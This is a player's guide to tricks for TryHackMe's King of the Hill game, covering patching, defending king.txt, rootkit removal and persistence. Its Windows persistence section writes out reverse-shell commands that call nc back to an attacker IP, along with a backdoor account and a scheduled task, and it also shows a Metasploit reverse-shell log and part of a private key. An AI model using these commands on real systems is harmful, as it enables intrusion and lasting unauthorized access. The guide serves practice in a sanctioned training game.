# TryHackMe KoTH Tricks

- "Don't use cheats on koth, just play for fun, learn from other players, learn new techniques, for me, this is the essence of a battlegrounds style game".

## Introduction

King of the Hill (KoTH) is a competitive hacking game, where you play against 10 other hackers to compromise a machine and then patch its vulnerabilities to stop other players from also gaining access. The longer you maintain your access, the more points you get.

But the real challenge for the koth player is defending /root/king.txt . On windows machines king is in C:\king.txt or in C:\Users\Admininstrator\king-server\king.txt

## Defense/Patching Linux Box

On linux machines, most people get root through PwnKit, to prevent players from getting root access, just remove the suid from the pkexec binary.

### [ Patching Root Access ]

```
chmod -s /usr/bin/pkexec
```

In addition to pwnkit, players abuse SUID in binaries like find, bash, mount, among other binaries, to remove SUID from binaries just use the command;

```
chmod -s $(which find)
```

You can find binaries that have SUID and if through the binary you found, there is a way to abuse it to have a rooted shell, to find binaries like that you can use the following command;

```
find / -perm /4000 2>/dev/null
```

In addition to SUID, you can check the following files;

- /etc/sudoers - layers abuse this to build their persistence.
- /etc/sudoers.d - layers abuse this to build their persistence.
- /etc/crontab - Players abuse this to build their persistence.
- /var/spool/* - layers abuse this to build their persistence.
- /etc/systemd/system - Players abuse this to build their persistence.
- */.ssh/ - layers abuse this to build their persistence.
- /opt/
- /etc/passwd - Players Create your own user.
- /etc/shadow - Players Create your own user.
- */.bashrc - Players abuse this to build their persistence.

You can also change the password for the root user, among other existing users on the machine, for this, you can use onelines, like;

```
echo -e "hackerpassword\nhackerpassword" | passwd root
echo -e "hackerpassword\nhackerpassword" | passwd user
```

I think this is enough to protect the machine, if you are the first to enter the machine, and patching so that other players do not have root, you already have a great advantage.

### [ Patching Web Application Vulnerable ]

Most koth linux machines, you can get a reverse shell, through a simple command injection, you can get an LFI, Backdoors on different ports, among others. I'll put the main ways to defend, The patched codes too.

- Command Injection in Tyler Machine

```
[root@tyler betatest]# cat checkuser.php
<?php
if (isset($_POST['submit'])) {
    $user = $_POST['user'];
    if (preg_match("/^[a-zA-Z0-9_]+$/", $user)) {
        $user = escapeshellarg($user);

        $cmd1 = "cat /etc/passwd | grep " . $user;
        echo system($cmd1);
    } else {
        echo "Invalid user input";
    }
// flag{REDACTED}
}
?>
[root@tyler betatest]#

```

- LFI In Lion Machine

```
root@lion:/var/www/nginx# cat -v index.php
<html>
<head>
<link rel="stylesheet" type="text/css" href="bootstrap.min.css">
</head>
<body>
<nav class="navbar navbar-expand-lg navbar-dark bg-dark">
  <a class="navbar-brand" href="/">Gloria's Personal Site</a>
  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarColor02" aria-controls="navbarColor02" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>

  <div class="collapse navbar-collapse" id="navbarColor02">
    <ul class="navbar-nav mr-auto">
      <li class="nav-item active">
        <a class="nav-link" href="/">Home <span class="sr-only">(current)</span></a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="?page=posts.php">Posts</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="?page=about.php">About</a>
      </li>
    </ul>
  </div>
</nav>
<div class="container"><br />
<h2>Gloria's Personal Site</h2>
<img src="image.png" style="width:400px;height:300px;"><br />
<?php
$allowedPages = array(
    'posts.php',
    'about.php'
);

$page = $_GET["page"];

if (in_array($page, $allowedPages)) {
    include($page);
} else {
    echo "No LFI for You x)";
}
?>
</div>
</body>
</html>

root@lion:/var/www/nginx#
```

- Unrestricted File load and Perl Reverse shell in Lion Machine

```
root@lion:/var/www/html/upload# ls
image.png  index.php  uploads
root@lion:/var/www/html/upload# cat -v index.php
<?php
$filename = uniqid() . "-" . time();
$extension = pathinfo($_FILES["fileToUpload"]["name"], PATHINFO_EXTENSION);
$basename = $filename . '.' . $extension;
$target_dir = "uploads/";
$target_file = $target_dir . $basename;
$uploadOk = 1;

if (isset($_POST["submit"])) {
    // Check if file already exists
    if (file_exists($target_file)) {
        echo "Sorry, file already exists.";
        $uploadOk = 0;
    }

    // Check file size (limit to 500KB)
    $maxFileSize = 500000;
    if ($_FILES["fileToUpload"]["size"] > $maxFileSize) {
        echo "Sorry, your file is too large.";
        $uploadOk = 0;
    }

    // Validate file extension
    $allowedExtensions = array("jpg", "jpeg", "png", "gif");
    if (!in_array($extension, $allowedExtensions)) {
        echo "Sorry, only JPG, JPEG, PNG, and GIF files are allowed.";
        $uploadOk = 0;
    }

    // Check if $uploadOk is set to 0 by an error
    if ($uploadOk == 0) {
        echo "Sorry, your file was not uploaded.";
    } else {
        // If everything is ok, try to upload file
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            echo "The file " . basename($_FILES["fileToUpload"]["name"]) . " has been uploaded.";
            // Process or store the uploaded file securely
            // Do not execute the file directly
        } else {
            echo "Sorry, there was an error uploading your file.";
        }
    }
}
?>

<!DOCTYPE html>
<html>
<body>
    <center><br />
        <img src="image.png" style="width:300px;height:300px;"><br /><br />
        <form action="index.php" method="post" enctype="multipart/form-data">
            Select file to upload:
            <input type="file" name="fileToUpload" id="fileToUpload">
            <input type="submit" value="Upload" name="submit">
        </form>
    </center>
</body>
</html>

root@lion:/var/www/html/upload#
```

- Nostromo RCE In Lion Machine

```
root@lion:/var/nostromo/htdocs# ls
cgi-bin  image.png  index.html  nostromo.gif
root@lion:/var/nostromo/htdocs# ss -anlpt|grep 8080
LISTEN     0      128          *:8080                     *:*                   users:(("nhttpd",pid=958,fd=3))
root@lion:/var/nostromo/htdocs# export machineIP=10.10.76.94
root@lion:/var/nostromo/htdocs# kill -9 958
root@lion:/var/nostromo/htdocs# python3 -m http.server 8080 -b $machineIP
Serving HTTP on 10.10.76.94 port 8080 ...
10.14.39.200 - - [01/Jul/2023 12:38:53] code 501, message Unsupported method ('POST')
10.14.39.200 - - [01/Jul/2023 12:38:53] "POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0" 501 -
10.14.39.200 - - [01/Jul/2023 12:39:57] "GET / HTTP/1.1" 200 -
10.14.39.200 - - [01/Jul/2023 12:40:05] "GET / HTTP/1.1" 200 -
10.14.39.200 - - [01/Jul/2023 12:40:05] code 501, message Unsupported method ('POST')
10.14.39.200 - - [01/Jul/2023 12:40:05] "POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.1" 501 -
```

In My Machine

```
msf6 exploit(multi/http/nostromo_code_exec) > run

[*] Started reverse TCP handler on 10.14.39.200:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The target is not exploitable. ForceExploit is enabled, proceeding with exploitation.
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/nostromo_code_exec) >
```

- Backdoor In Panda Machine
```
[root@panda 06d63d6798d9b6c2f987f045b12031d6]# ls
flag  index.php
[root@panda 06d63d6798d9b6c2f987f045b12031d6]# cat -v index.php
<html>
<head>
</head>
<body>
 <form action="index.php" method="POST">
  <label for="cmd">cmd: </label>
  <input type="text" id="cmd" name="cmd">
  <input type="submit" value="submit">
</form>
<?php
if ($_POST['cmd']){
  echo "No command execution, matheuz was kidding you x)";
}
?>
</body>
</html>
[root@panda 06d63d6798d9b6c2f987f045b12031d6]#
```

- Changing Password Tomcat in Shrek Machine

```
[root@shrek conf]# pwd
/opt/tomcat/conf
[root@shrek conf]# cat tomcat-users.xml
<--------------------------------------------------->
<tomcat-users>
<user username="admin" password="yourpassword" roles="manager-gui,admin-gui"/>
</tomcat-users>
<--------------------------------------------------->
[root@shrek conf]#
```

- File containing SSH-KEY for user

```
[root@shrek html]# pwd;head -n10 Cpxtpt2hWCee9VFa.txt #This is SSH-KEY
/var/www/html
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAsKHyvIOqmETYwUvLDAWg4ZXHb/oTgk7A4vkUY1AZC0S6fzNE
JmewL2ZJ6ioyCXhFmvlA7GC9iMJp13L5a6qeRiQEVwp6M5AYYsm/fTWXZuA2Qf4z
8o+cnnD+nswE9iLe5xPl9NvvyLANWNkn6cHkEOfQ1HYFMFP+85rmJ2o1upHkgcUI
ONDAnRigLz2IwJHeZAvllB5cszvmrLmgJWQg2DIvL/2s+J//rSEKyISmGVBxDdRm
T5ogSbSeJ9e+CfHtfOnUShWVaa2xIO49sKtu+s5LAgURtyX0MiB88NfXcUWC7uO0
Z1hd/W/rzlzKhvYlKPZON+J9ViJLNg36HqoLcwIDAQABAoIBABaM5n+Y07vS9lVf
RtIHGe4TAD5UkA8P3OJdaHPxcvEUWjcJJYc9r6mthnxF3NOGrmRFtDs5cpk2MOsX
u646PzC3QnKWXNmeaO6b0T28DNNOhr7QJHOwUA+OX4OIio2eEBUyXiZvueJGT73r
I4Rdg6+A2RF269yqrJ8PRJj9n1RtO4FPLsQ/5d6qxaHp543BMVFqYEWvrsdNU2Jl
[root@shrek html]# echo "" > Cpxtpt2hWCee9VFa.txt
[root@shrek html]# cat Cpxtpt2hWCee9VFa.txt

[root@shrek html]#

```

### [ Protect King File ]

Undoubtedly, the biggest challenge of KoTH is protecting the king, many people send me messages asking how do I protect the king, or about how to protect the king, So, in this session I decided to put my defense technique in KoTH, and I will also put techniques that other players use.

We can say that chattr today on KoTH is not as strong as it used to be, as many players created their own defense techniques on king. But here I'm going to mention defense techniques in king, which you can use, and are also techniques that other players use in every koth game.

- Whiles for protect /root/king.txt using chattr.

> while [ 1 ]; do chattr -ia /root/king.txt 2>/dev/null; echo -n "YourNick" >| /root/king.txt 2>/dev/null; chattr +ia /root/king.txt 2>/dev/null; done &

- Mount Trick.

```
sudo lessecho USERNAME > /root/king.txt
sudo dd if=/dev/zero of=/dev/shm/root_f bs=1000 count=100
sudo mkfs.ext3 /dev/shm/root_f
sudo mkdir /dev/shm/sqashfs
sudo mount -o loop /dev/shm/root_f /dev/shm/sqashfs/
sudo chmod -R 777 /dev/shm/sqashfs/
sudo lessecho USERNAME > /dev/shm/sqashfs/king.txt
sudo mount -o ro,remount /dev/shm/sqashfs
sudo mount -o bind /dev/shm/sqashfs/king.txt /root/king.txt
sudo rm -rf /dev/shm/root_f 
```

By the way, if you try to put your nick once in /root/king.txt and the message "Read-only file system" appears, most likely, the other player is using this technique

To undo this, just use umount.

> umount -l /root/king.txt or umount -l /root

- "symbolic link" using "ln" command.

```mkdir /dev/shm/...
cp -r /root/ /dev/shm/...
cd /dev/shm/.../root
rm king.txt
echo "YourNick" > ...
ln -s ... king.txt
```

It's up to your imagination what you can try to add to this and what to do x).

- Chattr for block /root.

> cd / && chattr +ia root

- Oneline using date, to combine.

```
while true; do
    chattr -ia /root/king.txt 2>/dev/null
    echo -n "YourNick" >| /root/king.txt 2>/dev/null
    chattr +ia /root/king.txt 2>/dev/null
    sleep $((60 - $(date +%S) % 60))
done &

```


- Intercept Syscall Write from /root/king.txt.

> This technique is very advanced using LKM ( Loadable Kernel Module) that is, at the kernel/ring0 level, me and F11snipe use it, basically if you try to put your nickname in king.txt, nothing will happen and the nickname of who is using the intercept syscall write will remain, as this file is being intercepted.

In this technique, I plan to add my C code along with its Makefile very soon.

- LD_PRELOAD for defense of king.

Soon I will also add a code for this way to defend the king

- Programs written in C to protect the king.

The [kingmaker](https://raw.githubusercontent.com/ChrisPritchard/ctf-writeups/master/tryhackme-koth/tools/kingmaker.c) that "Aquinas" created a while ago, to defend the king, is really good, and you can take the code in C, study and improve it.

These are the main ways to defend the king, other KoTH players also use these same techniques to defend the king.

I think that from this, you can have A LOT of ideas, even ideas for you to create your own script/way to defend the king.

### [ Defending Linux Box From Rootkits ]

Some players use rootkits in KoTH games, I think that many players don't know how to defend against a rootkit, so it is in this section that I will put some points to be able to defend and disable a rootkit.

- sysctl

Basically the command "sudo sysctl -w kernel.modules_disabled=1" disables the loading of kernel modules in the Linux operating system, restricting the ability to load and unload modules during execution. This can be useful for improving security by preventing unauthorized or malicious modules from being loaded into the system's kernel.

For this to work you would have to run this command before the player loads your rootkit/LKM. Because if the enemy player loads the rootkit first, this command will have no effect.

Hint: you really have to be really quick as there are some people who use autopwn.

> sudo sysctl -w kernel.modules_disabled=1

- blocking insertion of new modules using LKM

it is possible to make LKM that blocks the insertion of new modules, I had made one, however, when I went to load it in KoTH machines, the machine broke completely, so I could not proceed with this, but you can search, and try to create your own own.

- Diamorphine rootkit with its default kill signal

I realize that KoTH players use diamorphine rootkit, but do not change the kill signal 63 (remembering that if you kill this PID and put 0 after it, the rootkit module will reappear).

> kill -63 0 && rmmod diamorphine

If in case the module name is not "diamorphine", you can check the others using lsmod.

> lsmod | head -n5

- LD_PRELOAD Rootkit

It is common for koth players to also use the LD_PRELOAD rootkit. The good news is that removing it is not very complex, just follow these commands below.

> echo "" > /etc/ld.so.preload && rm /lib/NameOf.So

To discover the ".so" from the LD_PRELOAD rootkit, you can check the /lib/*.


## Persistence KoTH Linux Machines

You can check my repository about persistence, all the techniques I use in koth, it's there.

### [DemonizedShell](https://github.com/MatheuZSecurity/D3m0n1z3dShell)

Additional: you can use the mount command to mount a process in another directory, for example;

> mount --bind /tmp /proc/PID

Therefore, if you look at the processes, the PID you put there will no longer appear, I think many players use this trick too.

To undo this is simpler than it seems.

> mount | grep proc && umount /proc/PID

## Windows KoTH Machines

On koth windows machines I think I'll put only the essentials in my view.

### Protect King

- Using loop in combination with attrib.

Offline Machine

```
@echo off
:x
attrib -a -s -r -i C:\Users\Administrator\king-server\king.txt&echo YourNickHere > C:\Users\Administrator\king-server\king.txt&attrib +a +s +r +i C:\Users\Administrator\king-server\king.txt
goto x
```

H1-Medium Machine

```
@echo off
:x
attrib -a -s -r -i C:\ing.txt&echo YourNickHere > C:\king.txt&attrib +a +s +r +i C:\king.txt
goto x
```

- Icalcs

> icacls king.txt /deny Everyone:(W)

This command will basically deny write permission ("W") for the group "Everyone" on the file "king.txt"

Note that you can deny write permission for the Administrator user as well.

> icacls king.txt /deny Administrator:(M)

You can use icacls in a loop too, it's up to your imagination :D

Well, I think this is enough for king protection on windows koth machines (until now).

### Persistence

I think koth players rarely use persistence on windows machines, anyway I'll put some.

- Service Execution

Creating an malicious service.

```
sc create fsociety binpath= "C:\nc.exe yourIP PORT -e cmd.exe" start= "auto" obj= "LocalSystem" password= ""
```

- New Account

Creating New account.

> net user mrpwn mrpwnpassword123! /add

- SchTasks

Creating a new scheduled task that will launch shell.cmd every minute.

```
schtasks /create /sc minute /mo 1 /tn "yourtask" /tr C:\shell.cmd /ru "SYSTEM"
```

- Powershell Profile Persistence

As soon as the user starts a new powershell, the command will be executed.

```
$PROFILE | select *
echo "C:\temp\nc.exe YourIP Port -e powershell" > C:\temp\payload.exe" > $PROFILE
cat $PROFILE
```

You can also use C2 (Command & Control).

## References and studies

[Terraminator](https://github.com/Terraminator)

[ired.team](https://www.ired.team/)

- Rootkit Studies

[rootkit diamorphine](https://github.com/m0nad/Diamorphine)

[xcellerator](https://xcellerator.github.io/tags/rootkit/)

[0x00sec.org](https://0x00sec.org/t/writing-a-simple-rootkit-for-linux/29034)

[h0mbre](https://h0mbre.github.io/Learn-C-By-Creating-A-Rootkit/)

[Syscall Hooking](https://blog.convisoappsec.com/linux-rootkits-hooking-syscalls/)

[jm33.me](https://jm33.me/tag/rootkit.html)

[Awesome Rootkits](https://github.com/milabs/awesome-linux-rootkits)

- Persistence

[DemonizedShell](https://github.com/MatheuZSecurity/D3m0n1z3dShell)

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Persistence.md)

[Hunting Persistence](https://pberba.github.io/security/2021/11/23/linux-threat-hunting-for-persistence-account-creation-manipulation/)

[vx-underground papers](https://www.vx-underground.org/#E:/root/Papers/Linux/Persistence)

[Persistence Cheat-Sheet](https://hackmag.com/security/persistence-cheatsheet/)

---------------------------------------------------------------------------
#### @MatheuzSecurity

